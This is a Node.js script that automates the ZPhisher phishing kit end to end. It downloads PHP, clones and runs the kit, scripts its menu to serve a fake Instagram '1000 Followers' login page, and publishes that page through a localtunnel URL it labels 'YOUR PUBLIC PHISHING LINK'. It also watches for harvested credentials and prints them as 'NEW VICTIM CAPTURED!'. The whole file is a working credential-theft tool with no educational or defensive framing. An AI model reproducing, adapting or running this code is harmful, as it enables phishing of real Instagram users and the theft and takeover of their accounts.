const { spawn, execSync } = require('child_process');
const fs = require('fs');
const https = require('https');
const path = require('path');
const localtunnel = require('localtunnel');

const phpUrl = 'https://dl.static-php.dev/static-php-cli/common/php-8.3.0-cli-linux-x86_64.tar.gz';
const phpTar = path.join(__dirname, 'php.tar.gz');
const phpDir = path.join(__dirname, 'php-bin');
const credFile = path.join(__dirname, 'zphisher', 'ip.txt');

function download(url, dest, redirectCount = 0) {
    if (redirectCount > 5) return Promise.reject(new Error('Too many redirects'));
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(dest);
        https.get(url, (response) => {
            if (response.statusCode >= 300 && response.statusCode < 400 && response.headers.location) {
                file.close(); fs.unlink(dest, () => {});
                const newUrl = new URL(response.headers.location, url).href;
                return download(newUrl, dest, redirectCount + 1).then(resolve).catch(reject);
            }
            if (response.statusCode !== 200) {
                file.close(); fs.unlink(dest, () => {});
                return reject(new Error(`Failed to download: ${response.statusCode}`));
            }
            response.pipe(file);
            file.on('finish', () => file.close(resolve));
        }).on('error', (err) => {
            file.close(); fs.unlink(dest, () => {}); reject(err);
        });
    });
}

async function startTunnel() {
    console.log('\n\n=== 🚀 LAUNCHING PERMANENT TUNNEL (localtunnel) ===');
    try {
        const tunnel = await localtunnel({ port: 8080 });
        
        console.log('\n\n\x1b[42m\x1b[30m======================================================\x1b[0m');
        console.log('\x1b[42m\x1b[30m🌟 YOUR PUBLIC PHISHING LINK IS READY:                \x1b[0m');
        console.log(`\x1b[42m\x1b[30m🔗 \x1b[4m${tunnel.url}\x1b[0m`);
        console.log('\x1b[42m\x1b[30m======================================================\x1b[0m');
        
        https.get('https://loca.lt/mytunnelpassword', (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                console.log('\n\x1b[43m\x1b[30m======================================================\x1b[0m');
                console.log('\x1b[43m\x1b[30m⚠️ IF THE LINK ASKS FOR A PASSWORD:                   \x1b[0m');
                console.log('\x1b[43m\x1b[30mCopy and paste this IP address into the box:         \x1b[0m');
                console.log(`\x1b[43m\x1b[30m🔑 \x1b[1m${data.trim()}\x1b[0m`);
                console.log('\x1b[43m\x1b[30m======================================================\x1b[0m\n\n');
            });
        });

        tunnel.on('close', () => {
            console.log('❌ Tunnel closed. Reconnecting...');
            setTimeout(startTunnel, 5000); 
        });

    } catch (err) {
        console.error('❌ Failed to create localtunnel:', err.message);
    }
}

async function main() {
    console.log("Starting ZPhisher automated setup...");

    if (!fs.existsSync(phpDir)) fs.mkdirSync(phpDir);
    if (!fs.existsSync(path.join(phpDir, 'php'))) {
        console.log("Downloading portable PHP...");
        await download(phpUrl, phpTar);
        console.log("Extracting PHP...");
        try {
            execSync(`tar -xzf ${phpTar} -C ${phpDir}`);
            let phpBinaryPath = path.join(phpDir, 'php');
            if (!fs.existsSync(phpBinaryPath)) {
                const files = fs.readdirSync(phpDir);
                for (const f of files) {
                    const fullPath = path.join(phpDir, f);
                    if (fs.statSync(fullPath).isDirectory()) {
                        const subPath = path.join(fullPath, 'php');
                        if (fs.existsSync(subPath)) { phpBinaryPath = subPath; break; }
                    }
                }
            }
            if (phpBinaryPath !== path.join(phpDir, 'php')) {
                fs.renameSync(phpBinaryPath, path.join(phpDir, 'php'));
            }
            fs.chmodSync(path.join(phpDir, 'php'), 0o755);
            console.log("✅ PHP installed locally.");
        } catch (e) {
            console.error("Failed to extract PHP:", e.message); process.exit(1);
        }
    }

    const env = { ...process.env, PATH: `${phpDir}:${process.env.PATH}` };

    const installCommands = `
      rm -rf zphisher && 
      git clone https://github.com/htr-tech/zphisher.git && 
      cd zphisher && 
      chmod +x zphisher.sh && 
      bash zphisher.sh
    `;

    const child = spawn(installCommands, {
        shell: true, stdio: ['pipe', 'pipe', 'pipe'], env: env 
    });

    let automationStarted = false;
    let tunnelStarted = false;

    child.stdout.on('data', (data) => {
        const text = data.toString();
        process.stdout.write(text);

        if (!automationStarted && text.includes('Select An Attack')) {
            automationStarted = true;
            console.log('\n\n=== 🤖 AUTOMATION SEQUENCE STARTED ===');
            
            setTimeout(() => child.stdin.write('2\n'), 1500); // 1. Instagram
            setTimeout(() => child.stdin.write('3\n'), 4000); // 2. CHANGE TO 3 (1000 Followers Page)
            setTimeout(() => child.stdin.write('1\n'), 6500); // 3. Localhost
            setTimeout(() => child.stdin.write('8080\n'), 8000); // 4. Port 8080
        }

        if (!tunnelStarted && (text.includes('Successfully Hosted') || text.includes('Waiting for Login Info'))) {
            tunnelStarted = true;
            startTunnel();
        }
    });

    child.stderr.on('data', (data) => {
        const msg = data.toString();
        if (!msg.includes('Cloning into') && !msg.includes('remote:')) {
            console.error(`[STDERR] ${msg}`);
        }
    });

    // Live Credential Watcher
    console.log('\n=== 🕵️‍♂️ CREDENTIAL WATCHER STARTED ===');
    setInterval(() => {
        if (fs.existsSync(credFile)) {
            const data = fs.readFileSync(credFile, 'utf8').trim();
            if (data.length > 0) {
                console.log('\n\n\x1b[41m\x1b[37m======================================================\x1b[0m');
                console.log('\x1b[41m\x1b[37m🔥 NEW VICTIM CAPTURED!                              \x1b[0m');
                console.log(`\x1b[41m\x1b[37m${data.split('\n').join('\n\x1b[41m\x1b[37m')}\x1b[0m`);
                console.log('\x1b[41m\x1b[37m======================================================\x1b[0m\n\n');
            }
        }
    }, 3000);
}

main().catch(console.error);